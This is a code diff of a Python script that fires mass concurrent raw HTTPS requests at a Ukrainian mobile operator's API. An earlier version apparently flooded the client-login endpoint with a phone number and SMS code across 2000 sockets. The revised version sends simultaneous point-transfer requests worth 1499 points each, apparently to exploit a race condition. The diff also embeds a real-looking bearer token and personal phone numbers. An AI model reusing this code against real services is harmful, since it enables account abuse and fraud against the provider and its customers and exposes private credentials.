@@ -17,22 +17,23 @@ SSL_CONTEXT = ssl.create_default_context()
 
 def craft_request():
     request_line = (
-        "POST /api/v1/client/auth HTTP/1.1\r\n"
+        "POST /api/v1/exchange-point HTTP/1.1\r\n"
     )
 
     data = json.dumps({
-        'phone': '+380956409567',
-        'code': '1252',
+        'recipient_phone': '+380956409567',
+        'points': 1499,
+        'comment': '',
     })
 
     content_len = len(data.encode())
     headers = {
         'user-agent': 'Android:11;version:1.12.0;Google sdk_gphone_x86',
-        'content-type': 'application/json',
         'accept': 'application/json',
-        'host': 'tosim.sim23.ua',
-        "content-length": content_len,
-        "host": HOST
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzEwMTM5OTAsImV4cCI6MTczMzY0MTk5MCwicm9sZXMiOlsiUk9MRV9DTElFTlQiXSwidG9rZW5JZGVudGlmaWVyU3RyaW5nIjoiKzM4MDk2MTU3NDM2OEAxNzMxMDEzOTkwIn0.PaqfvySPedRJKEJ2xjahbMF8xU7EMaRxgzkO4Yc5u-9t5hfJ4DYjDmmSlJrScbpWCLnlSMEbhN2Grk-jQiPpyFSTDY-EiiZ4evPiOfRuZsobqt6aXhRFJ21sy0T-S1q3Y34JuuDEom0fgrZ0mdqLNN6AisWbn_2lcCKIhUkH3kAk84hiVHc8XNmdYRSKBypNzNgxeJLpLEyNgZVMCbmZw3x8k6BPVz99wOEhcamJ4FOIQ8NyyaUW2_jpv3_CNPLhxzymPtHI6XUWC-rXBa4DPAuMnFiek8IqwRTZNJujsIXjEHg9ZdBUOrEXjutYnkF_lDo__5T-q6Zvs954QGtWqfRW5g29Xj-U-E_ASXhkYvoLyRWfA-i3XHYsq5XD8JchoKrdwpPai7eaRjG7Yz0zD5R_opes7LUp4GuneObN-LUHhBDwAbCimGS-wzrw4fpbzQ6c84vfk8H2U4KNMUycRFawjMd0oweHSPQGsu9PJJS-98jidz2pRNdNq98oI_pqgtQjUiC87T598_jsE5rMkHBvtATVJCN_8h9nACAewj3Ij1c8kYH7U30OneIN0rtGfqmb3Uw5OsOe-tLYq6-x2AckHsAJC1mSp_zKA_br43GFv76MVmHe5KnTiG-A919PXdgO6gnUUXCf3X0MysOepHy7v-3A8AkK3rck-6UAa2k',
+        'content-type': 'application/json',
+        'content-length': content_len,
+        'host': HOST
     }
     headers = "".join([f"{key.lower()}: {value}\r\n" for key, value in headers.items()])
 
@@ -71,13 +72,13 @@ async def main():
     # print(res)
     # sockets = [await open_socket() for i in range(1000)]
     start = time.time()
-    sockets = await asyncio.gather(*[open_socket() for _ in range(2000)], return_exceptions=True)
+    sockets = await asyncio.gather(*[open_socket() for _ in range(100)], return_exceptions=True)
     # sockets = [await open_socket() for i in range(200)]
     end = time.time()
     print(end - start)
     start = time.time()
-    for i in range(100):
-        res = await asyncio.gather(*[do_request2(sock) for sock in sockets if isinstance(sock, AsyncSSLSocket)], return_exceptions=True)
+    res = await asyncio.gather(*[do_request2(sock) for sock in sockets if isinstance(sock, AsyncSSLSocket)],
+                               return_exceptions=True)
     print(res)
     end = time.time()
     print(end - start)
